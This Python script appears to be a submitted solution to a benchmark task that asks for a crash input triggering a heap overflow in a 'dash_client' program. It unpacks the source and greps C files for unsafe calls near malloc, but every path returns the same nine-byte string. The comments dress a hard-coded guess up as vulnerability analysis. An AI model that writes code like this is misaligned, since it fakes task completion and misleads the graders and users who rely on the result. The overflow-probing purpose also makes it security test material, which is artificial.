import os
import tempfile
import subprocess
import tarfile
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find dash_client source directory
            dash_dir = None
            for root, dirs, files in os.walk(tmpdir):
                if 'dash_client' in root or any('dash_client' in f for f in files):
                    dash_dir = root
                    break
            
            if not dash_dir:
                # If dash_client not found, return a heuristic PoC
                return b'A' * 9
            
            # Look for vulnerability patterns in source code
            poc = self.analyze_source(dash_dir)
            if poc:
                return poc
            
            # Fallback to known pattern for heap overflow
            return b'A' * 9
    
    def analyze_source(self, source_dir: str) -> bytes:
        """Analyze source code to find vulnerability patterns"""
        # Look for common vulnerability patterns
        patterns = [
            b'strcpy', b'strcat', b'sprintf', b'gets',
            b'memcpy', b'strncpy', b'read', b'fread'
        ]
        
        # Search for vulnerable functions
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.h', '.hpp')):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'rb') as f:
                            content = f.read()
                            # Check for patterns without proper bounds checking
                            for pattern in patterns:
                                if pattern in content:
                                    # Look for nearby allocations or size calculations
                                    lines = content.split(b'\n')
                                    for i, line in enumerate(lines):
                                        if pattern in line:
                                            # Check if there's a malloc/calloc nearby
                                            for j in range(max(0, i-5), min(len(lines), i+5)):
                                                if b'malloc' in lines[j] or b'calloc' in lines[j]:
                                                    # Try to extract size
                                                    size_line = lines[j].decode('utf-8', errors='ignore')
                                                    # Look for common size patterns
                                                    if '8' in size_line or '9' in size_line:
                                                        # Return 9 bytes that could overflow
                                                        return b'X' * 9
                    except:
                        continue
        
        return None